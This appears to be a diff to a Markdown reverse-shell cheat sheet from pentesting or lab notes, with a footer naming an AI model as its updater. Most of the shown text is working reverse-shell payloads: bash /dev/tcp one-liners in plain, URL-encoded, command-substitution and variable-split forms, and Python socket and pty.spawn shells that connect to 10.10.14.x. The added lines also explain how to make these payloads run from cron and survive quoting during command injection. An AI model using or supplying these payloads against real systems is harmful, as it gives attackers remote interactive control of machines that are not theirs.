@@ -88,6 +88,8 @@ bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.x%2F4444%200%3E%261%
 $(bash -c 'bash -i >& /dev/tcp/10.10.14.x/4444 0>&1')
 ```
 
+> [!warning] `>& /dev/tcp/...` is **bash-only** — `sh`/dash (and therefore **cron**, whose shell is `/bin/sh`) can't parse it and fails *silently*. Whenever the redirection is read by a non-bash shell (a cron line, a `#!/bin/sh` script, an `at`/scheduler `--command`), wrap it so bash parses its own redirection: `bash -c 'bash -i >& /dev/tcp/host/port 0>&1'`. Full explanation + the `SHELL=/bin/bash` alternative: [[Linux Priv Esc]] → Cron Jobs.
+
 ### Python
 
 ```bash
@@ -95,6 +97,14 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.x",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
+
+**PTY variant — fully interactive on connect** (use `pty.spawn` instead of `subprocess.call`, so you land in a real TTY with job control, `sudo`, `su`, tab-completion — no separate [TTY upgrade](#tty-upgrade-linux) step):
+
+```bash
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.x",1337));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
+```
+
+> [!tip] Prefer the PTY variant when you can — `pty.spawn` allocates a pseudo-terminal at connect time, so the shell isn't the "dumb" pipe you get from `subprocess.call` (which hangs on `sudo`/`ssh`/`vi` and has no Ctrl-C). Still finish the upgrade with `stty raw -echo; fg` locally for full arrow-key/resize behavior — see [TTY Upgrade](#tty-upgrade-linux). When injecting through a shell that quotes aggressively (e.g. RCE via `subprocess.run(shell=True)`), the `[os.dup2(...) for f in(0,1,2)]` list-comprehension form avoids the semicolons/`for` loop that some quoting mangles.
 
 ### Perl
 
@@ -562,5 +572,5 @@ c=bas;h=h;$c$h -i >& /dev/tcp/10.10.14.x/4444 0>&1
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-07-21*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-08-14*
+*Model: claude-opus-5*
